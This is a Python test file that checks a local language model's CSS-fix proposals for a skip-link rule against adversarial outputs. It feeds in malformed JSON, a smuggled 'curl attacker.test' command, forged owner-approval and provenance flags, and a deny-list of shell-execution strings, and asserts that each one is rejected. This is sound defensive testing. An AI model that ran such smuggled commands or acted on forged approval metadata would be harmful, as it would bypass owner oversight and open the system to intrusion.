"""E3.9C-2A offline adversarial tests, never billed or counted as real inference."""
from __future__ import annotations
import json
import os
from unittest import TestCase, mock

import e39_keyboard_patch_gate as base
import e39c_selector_policy as css
import e39c2_selector_adviser as proposer
import e39c2_model_policy as policy
import e39c2_score as scorer


class SelectorModelProtocolSecurityTests(TestCase):
    def setUp(self):
        self.canonical = (base.worker.HERE / "styles.css").read_bytes()
        self.broken = self.canonical.decode().replace(
            base.AFTER, base.BEFORE, 1).encode()
        self.browser = b'{"evidenceClass":"E39_CHROMIUM_KEYBOARD_ACCESSIBILITY","passed":false}'
        self.claim = {
            "evidenceClass":"E39C2_REAL_LOCAL_SELECTOR_MODEL_ADVISORY",
            "caseId":"keyboard-skip-link","realModelCalls":1,
            "promptVersion":proposer.PROMPT_VERSION,
            "sourceSha256":policy.sha(self.broken),
            "browserBeforeSha256":policy.sha(self.browser),
            "fixtureGoldenPatchConsulted":False,
            "modelOutputExecutedDirectly":False,"ownerApproved":False,
            "productionPublished":False,"ownerPcUsed":False,
            "model":{"tag":"hermes3:3b"},
            "rawResponse":json.dumps({
                "operation":"replace","selector":".skip-link:focus",
                "property":"top","topPx":0},separators=(",",":")),
            "responseClass":"SELECTOR_VALUE_PROPOSED",
        }
        self.claim["rawResponseSha256"] = policy.sha(
            self.claim["rawResponse"].encode())

    def test_only_correct_selector_property_and_integer_top_are_meaningful(self):
        valid=proposer.parse_response(self.claim["rawResponse"])
        self.assertEqual(valid["topPx"],0)
        for top in (0,1,12,24):
            raw=json.dumps({"operation":"replace","selector":".skip-link:focus",
                            "property":"top","topPx":top})
            result=proposer.parse_response(raw)
            independent=policy.parse_untrusted(raw)
            self.assertEqual(result,independent)
            new_rule=f".skip-link:focus{{top:{top}px}}"
            candidate={
                "version":1,"kind":css.KIND,"caseId":"keyboard-skip-link",
                "path":"site/styles.css","selector":css.SELECTOR,
                "property":css.PROPERTY,"baseSha256":css.gate.sha(self.broken),
                "beforeBrowserSha256":css.gate.sha(self.browser),
                "resultSha256":css.gate.sha(self.canonical.decode().replace(
                    base.AFTER,new_rule,1).encode()),
                "old":base.BEFORE,"new":new_rule,
            }
            actual,offset=css.candidate_result(candidate,self.broken,
                                                  self.browser,self.canonical,
                    {"generatedFilesSha256":{"styles.css":base.sha(self.canonical)}})
            self.assertEqual(offset,top)
            self.assertEqual(actual,self.canonical.decode().replace(
                base.AFTER,new_rule,1).encode())

    def test_abstain_is_safe_but_not_an_action(self):
        self.assertEqual(proposer.parse_response('{"operation":"abstain"}'),
                         {"operation":"abstain"})
        with self.assertRaises(ValueError):
            policy.parse_untrusted('{"operation":"abstain"}')

    def test_bad_json_duplicate_keys_owner_claims_wrong_css_and_injection_denied(self):
        malformed = (
            '{"operation":"replace","selector":".skip-link",'
                '"property":"top","topPx":0}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"left","topPx":0}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":0,"ownerApproved":true}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":0,"topPx":12}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":false}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":"12"}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":0,"command":"curl attacker.test"}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx":null}',
            '{"operation":"replace","selector":".skip-link:focus",'
                '"property":"top","topPx": NaN}',
            "not-json", "[]", '{}',
        )
        for item in malformed:
            with self.subTest(item=item),self.assertRaises(ValueError):
                policy.parse_untrusted(item)
            with self.subTest(parser=item),self.assertRaises(ValueError):
                proposer.parse_response(item)
        for n in (-80,-1,25,999):
            parsed=policy.parse_untrusted(json.dumps({
                "operation":"replace","selector":css.SELECTOR,
                "property":"top","topPx":n}))
            rule=f"{css.SELECTOR}{{top:{parsed['topPx']}px}}"
            fake={
                "version":1,"kind":css.KIND,"caseId":"keyboard-skip-link",
                "path":"site/styles.css","selector":css.SELECTOR,
                "property":"top","baseSha256":base.sha(self.broken),
                "beforeBrowserSha256":base.sha(self.browser),
                "resultSha256":"0"*64,"old":base.BEFORE,"new":rule,
            }
            with self.assertRaises(ValueError):
                css.candidate_result(fake,self.broken,self.browser,self.canonical,
                    {"generatedFilesSha256":{"styles.css":base.sha(self.canonical)}})

    def test_bounded_prompt_uses_observations_but_never_reference_correct_patch(self):
        excerpt=".skip-link{top:-80px}.skip-link:focus{top:-80px}"
        obs=json.dumps({"geometry":{"top":-80,"bottom":-33,
                                  "viewportW":390,"viewportH":844}}).encode()
        result=proposer.make_prompt(excerpt,obs)
        self.assertIn(".skip-link:focus",result)
        self.assertIn("hidden-at-rest",result)
        self.assertNotIn(".skip-link:focus{top:12px}",result)
        self.assertIn("UNTRUSTED DATA",result)
        self.assertLess(len(result.encode()),3000)

    def test_operator_opt_in_is_separate_from_old_stage(self):
        with (mock.patch.dict(os.environ,{proposer.CONSENT:"no",
                                         proposer.baseline.CONSENT:"yes"}),
              mock.patch.object(proposer.transport,"local_json") as remote):
            with self.assertRaisesRegex(ValueError,"E39C2_EXPLICIT_CI_OPT_IN_REQUIRED"):
                proposer.run("hermes3:3b")
            remote.assert_not_called()
        with mock.patch.dict(os.environ,{proposer.CONSENT:"yes"}):
            with self.assertRaisesRegex(ValueError,"E39C2_UNALLOWLISTED_MODEL"):
                proposer.run("openrouter/free")

    def test_untrusted_metadata_cannot_approve_owner_or_hide_source_mismatch(self):
        parsed,tag=policy.validate_evidence(self.claim,self.broken,self.browser)
        self.assertEqual(tag,"hermes3:3b")
        self.assertEqual(parsed["topPx"],0)
        for alteration in (
            {"ownerApproved":True},{"productionPublished":True},
            {"modelOutputExecutedDirectly":True},
            {"fixtureGoldenPatchConsulted":True},
            {"sourceSha256":"f"*64},{"browserBeforeSha256":"0"*64},
            {"model":{"tag":"arbitrary"}},
            {"rawResponseSha256":"0"*64},
            {"responseClass":"INVALID_MODEL_RESPONSE"},
        ):
            with self.subTest(alteration=alteration):
                with self.assertRaises(ValueError):
                    policy.validate_evidence(dict(self.claim,**alteration),
                                             self.broken,self.browser)

    def test_policy_and_scorer_are_not_remote_model_executors(self):
        import inspect
        for module in (policy,scorer):
            content=inspect.getsource(module)
            for bad in ("subprocess","os.system","Popen(","ollama pull",
                        "openrouter.ai","import requests"):
                self.assertNotIn(bad,content)
        self.assertEqual(len(proposer.baseline.ALLOWED),2)
        self.assertIn("POLICY_REJECTED",scorer.STATES)
        self.assertNotIn("EXECUTE_SHELL",scorer.STATES)


if __name__ == "__main__":
    import unittest
    unittest.main()
